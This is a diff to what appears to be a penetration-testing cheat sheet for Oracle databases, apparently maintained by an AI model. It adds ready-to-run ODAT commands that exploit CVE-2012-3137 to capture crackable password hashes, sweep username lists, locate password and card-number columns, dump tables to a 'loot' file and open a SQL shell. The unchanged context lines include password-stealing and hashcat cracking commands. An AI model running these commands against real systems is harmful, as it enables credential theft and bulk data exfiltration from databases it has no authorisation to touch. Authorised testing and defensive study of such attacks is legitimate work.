@@ -158,6 +158,12 @@ odat java -s <target-ip> -p 1521 -d <SID> -U user -P password \
 odat passwordstealer -s <target-ip> -p 1521 -d <SID> -U user -P password --get-passwords
 #   variants: --get-all-passwords, --get-passwords-not-locked, --get-passwords-from-history,
 #             --get-passwords-ocm  (indirect, CVE-2020-2984, Oracle 12c+)
+
+# stealremotepwds — capture a crackable hash from the AUTH handshake (CVE-2012-3137, 11g).
+# For a valid USERNAME the server leaks the O5LOGON session key + salt during auth, giving an
+# offline-crackable hash. --user-list sweeps many usernames; --decrypt-sessions works a saved capture:
+odat stealremotepwds -s <target-ip> -p 1521 -d <SID> -U <valid-username> --get-all-passwords
+odat stealremotepwds -s <target-ip> -p 1521 -d <SID> --user-list users.txt --get-all-passwords
 ```
 
 ```bash
@@ -167,6 +173,29 @@ hashcat -m 112 hashes.txt /usr/share/wordlists/rockyou.txt
 
 # Oracle 12c (SHA-512 based) — hashcat mode 12300
 hashcat -m 12300 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+---
+
+## Search & Dump Data (the `search` module)
+
+Once authenticated, `search` is the fast way to locate and pull sensitive data without writing SQL:
+
+```bash
+# Auto-find columns whose names look like passwords/secrets across the whole DB
+odat search -s <target-ip> -p 1521 -d <SID> -U user -P password --pwd-column-names
+
+# Find any column matching a pattern
+odat search -s <target-ip> -p 1521 -d <SID> -U user -P password --column-names "card"
+
+# Describe accessible tables, then dump one (whole table or specific columns)
+odat search -s <target-ip> -p 1521 -d <SID> -U user -P password --desc-tables
+odat search -s <target-ip> -p 1521 -d <SID> -U user -P password --dump HR.EMPLOYEES:FIRST_NAME,SALARY
+# Write results to CSV + XLSX (one sheet per table):
+odat search -s <target-ip> -p 1521 -d <SID> -U user -P password --dump HR.EMPLOYEES --dump-file loot
+
+# Drop into a minimal interactive SQL shell
+odat search -s <target-ip> -p 1521 -d <SID> -U user -P password --sql-shell
 ```
 
 ---
@@ -207,5 +236,5 @@ sqlplus scott/tiger@192.168.1.10:1521/ORCL
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-08-27*
-*Model: claude-opus-5*
+*Updated: 2026-09-29*
+*Model: claude-opus-4-8*
